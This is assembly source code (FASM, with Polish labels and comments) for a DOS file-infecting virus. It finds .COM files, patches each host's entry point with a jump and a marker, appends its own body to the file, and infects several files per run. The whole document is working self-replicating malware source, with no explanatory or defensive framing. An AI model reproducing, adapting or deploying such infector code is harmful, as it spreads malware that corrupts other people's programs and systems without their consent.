format binary

P21H_PLIK_SZUKAJ_MASKA equ 4e00h
P21H_PLIK_SZUKAJ_NASTEPNEGO equ 4fh
P21H_PLIK_OTWORZ equ 3dh
P21H_PLIK_ODCZYTAJ equ 3fh
P21H_PLIK_ZAPISZ equ 40h
P21H_PLIK_ZAMKNIJ equ 3eh
P21H_PLIK_WSKAZNIK_PRZESUN equ 42h
P21H_PLIK_WSKAZNIK_KONIEC equ 02h
P21H_PLIK_TRYB_ODCZYT equ 0h
P21H_P_TRYB_ODCZYT_ZAPIS equ 2h
P21H_DTA_OFFSET equ 80h
P21H_PLIK_ROZMIAR_OFFSET equ 1ah
P21H_PLIK_NAZWA_OFFSET equ 9eh

PLIK_SZUKAJ_ATRYBUTY equ 7h
PLIK_ZARAZONY_ZNACZNIK equ 'XX'
PLIK_POCZATEK_DLUGOSC equ 1ah
P_ZARAZONY_ZNACZNIK_OFFSET equ 3h
LICZBA_DO_ZARAZENIA equ 5h

org 100h

start:
; skok dwie instrukcje dalej zapisany jako ciąg bajtów
  db 0e9h, 2h, 0h
  dw PLIK_ZARAZONY_ZNACZNIK
plik_zarazenie:
; obliczenie przesunięcia wszystkich etykiet w programie i zapisanie w bp
  call przesuniecie
przesuniecie:
  pop bp
  sub bp, przesuniecie
; po wejściu w kod wirusa przywrócenie pierwotnego początku pliku
  lea si, [bp + plik_poczatek]
  mov di, 100h
; adres powrotu do początku programu na stos
  push di
  movsb
  movsw
  movsw
  mov [bp + pliki_zarazone_licznik], byte 0h
  lea dx, [bp + plik_maska]
  cmp [bp + pliki_zarazone_licznik], LICZBA_DO_ZARAZENIA
  ja plik_zarazenie_koniec
  mov ax, P21H_PLIK_SZUKAJ_MASKA
  mov cx, PLIK_SZUKAJ_ATRYBUTY
plik_szukaj:
  int 21h
  jc plik_zarazenie_koniec
  call zarazenie
  mov ah, P21H_PLIK_SZUKAJ_NASTEPNEGO
  jmp plik_szukaj
plik_zarazenie_koniec:
  retn
  
zarazenie:
  mov al, P21H_PLIK_TRYB_ODCZYT
  call plik_otworz
  mov ah, P21H_PLIK_ODCZYTAJ
  mov cx, PLIK_POCZATEK_DLUGOSC
  lea dx, [bp + bufor]
  int 21h
  mov ah, P21H_PLIK_ZAMKNIJ
  int 21h
; pobranie wielkości zarażanego pliku
  mov bx, word [bp + P21H_DTA_OFFSET + P21H_PLIK_ROZMIAR_OFFSET]
  cmp word [cs:bp + bufor + P_ZARAZONY_ZNACZNIK_OFFSET], PLIK_ZARAZONY_ZNACZNIK
  je zarazenie_koniec
; obliczenie adresu skoku do wirusa jako wielkość pliku - długość instrukcji skoku
  sub bx, 3h
; zachowanie pierwotnego początku zarażanego pliku
  lea si, [bp + bufor]
  lea di, [bp + plik_poczatek]
  movsb
  movsw
  movsw
; podmiana pierwszego bajtu na instrukcję skoku
  mov [bp + bufor], byte 0e9h
; zapisanie adresu skoku do wirusa
  mov word [bp + bufor + 1h], bx
  mov word [bp + bufor + P_ZARAZONY_ZNACZNIK_OFFSET], PLIK_ZARAZONY_ZNACZNIK
; podmiana początkowych pięciu bajtów zarażanego pliku
  mov al, P21H_P_TRYB_ODCZYT_ZAPIS
  call plik_otworz
  mov ah, P21H_PLIK_ZAPISZ
  lea dx, [bp + bufor]
  mov cx, 5h
  int 21h
  jc plik_zamknij
; dopisanie wirusa do pliku
  mov al, P21H_PLIK_WSKAZNIK_KONIEC
  mov ah, P21H_PLIK_WSKAZNIK_PRZESUN
  xor cx, cx
  xor dx, dx
  int 21h
  mov ah, P21H_PLIK_ZAPISZ
  mov cx, koniec - plik_zarazenie
  lea dx, [bp + plik_zarazenie]
  int 21h
  inc [bp + pliki_zarazone_licznik]
plik_zamknij:
  mov ah, P21H_PLIK_ZAMKNIJ
  int 21h
zarazenie_koniec:
  ret
  
plik_otworz:
  mov ah, P21H_PLIK_OTWORZ
  mov dx, P21H_PLIK_NAZWA_OFFSET
  int 21h
; uchwyt pliku do ax
  xchg ax, bx
  ret
  
plik_maska db "*.com", 0h
plik_poczatek db 0cdh, 20h, 0, 0, 0
pliki_zarazone_licznik db 0h
bufor: times PLIK_POCZATEK_DLUGOSC db ?

koniec:

